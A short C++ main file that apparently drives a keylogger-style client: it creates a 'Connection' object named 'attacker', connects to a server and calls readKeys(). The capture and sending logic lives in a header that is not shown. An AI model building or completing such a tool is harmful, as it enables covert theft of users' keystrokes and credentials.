#include <iostream>
#include <fstream>
#include <conio.h>
#include <thread>
#include <filesystem>
#include "Connection.h"



int main() {
	Connection attacker;

	attacker.connectToServer();
	attacker.readKeys();
	
	return 0;
}